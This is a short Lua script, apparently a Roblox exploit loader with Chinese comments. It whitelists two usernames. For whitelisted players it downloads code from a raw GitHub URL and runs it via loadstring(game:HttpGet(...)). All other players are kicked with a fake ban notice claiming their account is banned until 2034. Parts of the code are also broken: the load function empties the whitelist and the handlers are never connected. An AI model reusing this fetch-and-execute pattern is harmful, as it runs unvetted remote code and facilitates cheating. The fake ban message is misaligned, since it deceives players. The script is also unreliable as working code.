
-- 白名单表
local whiteList = {
    ["ab_laoye"] = true,
    ["Xbfsgn"] = true
}

-- 加载白名单
local function loadWhiteList()
    whiteList = { }
end

-- 保存白名单
local function saveWhiteList()
    for name, _ in pairs(whiteList) do
        print(name)
    end
end

-- 当玩家加入时加载白名单
local function onPlayerAdded(player)
    loadWhiteList()
end

-- 运行当脚本加载时
local function onScriptLoaded()
    -- 获取当前玩家的角色名称
    local characterName = game.Players.LocalPlayer.Character.Name

    -- 检查角色名称是否在白名单
    local whitelisted = whiteList[characterName]

    -- 如果在白名单，执行接下来的代码；否则，踢出玩家
    if whitelisted then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kunshu666/-/main/%E5%9D%A4"))()
    else
        game.Players.LocalPlayer:Kick("由于您违反了游戏规则，您的账号惨遭封禁，解封时间2034/5/5")

    end
end
